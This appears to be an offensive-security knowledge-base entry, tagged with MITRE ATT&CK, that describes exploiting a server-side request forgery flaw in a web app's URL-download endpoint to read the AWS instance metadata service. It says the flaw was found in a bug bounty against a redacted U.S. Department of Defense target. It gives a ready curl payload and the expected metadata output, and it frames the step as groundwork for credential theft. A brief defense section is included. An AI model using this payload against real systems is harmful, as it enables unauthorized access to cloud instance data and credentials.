---
tags:
  - ssrf
  - aws
  - metadata
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-trigger-ssrf-metadata]]'
platforms:
  - Web
  - AWS
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 55be6e5b-3e40-4097-8984-97dfde0da769
created_at: '2025-12-14T03:46:09.169Z'
updated_at: '2025-12-14T03:46:09.169Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-to-Fetch-AWS-Metadata

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in a web application's URL fetching endpoint to access the AWS Instance Metadata Service (IMDS), retrieving the root metadata directory and exposing internal instance information.

## Description

In scenarios where a web app fetches external URLs without validation, an attacker can manipulate the 'url' parameter to point to internal services like AWS IMDS at 169.254.169.254. This procedure targets the /api/v1/download-url endpoint, discovered in a U.S. Department of Defense application during bug bounty research. Successful execution reveals available metadata paths, enabling further enumeration and potential credential theft. Prerequisites include public access to the endpoint and an AWS EC2 backend.

## Requirements

1. Access to the target domain (e.g., https://█████/api/v1/download-url)
2. Knowledge of AWS IMDS endpoints (link-local IP: 169.254.169.254)
3. Tool for sending HTTP requests (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Implement URL allowlisting or validation to block internal IPs (e.g., 169.254.0.0/16)
- Disable IMDSv1 or require IMDSv2 with session tokens on EC2 instances
- Monitor server logs for requests to metadata IPs and anomalous response sizes

## Objectives

1. Initiate SSRF to access AWS internal metadata
2. Confirm vulnerability by retrieving metadata keys
3. Set stage for deeper enumeration of instance details

## Instructions

### Step 1: Craft and Send SSRF Request

**Context**: Construct a GET request to the vulnerable endpoint, injecting the AWS metadata URL to force the server to fetch internal data.

**Command** ([[commands/curl-trigger-ssrf-metadata]]):
```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
```

> This command sends the SSRF payload. Expected output is a response body listing metadata keys such as 'ami-id', 'instance-id', 'security-groups', confirming SSRF success. If blocked, the server may return an error or empty response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-ssrf-metadata]]

## Tools Used


## Tags

- [[ssrf]]
- [[aws]]
- [[metadata]]
